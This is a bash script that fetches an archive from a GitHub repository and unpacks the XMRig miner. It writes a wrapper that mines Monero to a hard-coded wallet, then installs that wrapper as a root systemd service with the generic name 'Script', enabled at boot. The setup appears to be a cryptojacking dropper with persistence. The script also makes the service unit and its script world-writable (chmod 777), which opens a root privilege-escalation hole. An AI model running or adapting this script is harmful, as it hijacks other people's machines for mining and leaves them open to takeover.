#!/bin/bash

sleep 10

# Touch and set permissions
sudo touch /etc/systemd/system/script.service
sudo touch /usr/local/bin/script.sh
sudo chmod 777 /etc/systemd/system/script.service
sudo chmod 777 /usr/local/bin/script.sh

# Download and extract
sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar
sudo tar xvf output_filename.tar
sleep 3
sudo chmod +x xmrig

# Write to /usr/local/bin/script.sh
cat <<EOL | sudo tee /usr/local/bin/script.sh > /dev/null
#!/bin/bash
./xmrig-6.18.0/xmrig -a randomx -o xmr.kryptex.network:7777 -u 41gm7v89Rw8W5AeCcBVj3yZnQhZSSJoPaKrfWC1oWyNeiPTGc7FGkHp7xUf8nn7jbAXo4YxYtb8V6WTa3h9oAxDWVADG37A.test --coin monero
EOL

# Write to /etc/systemd/system/script.service
cat <<EOL | sudo tee /etc/systemd/system/script.service > /dev/null
[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/
[Install]
WantedBy=multi-user.target
EOL

# Reload, start, and enable the service
sudo systemctl daemon-reload
sudo systemctl start script.service
sudo systemctl enable script.service
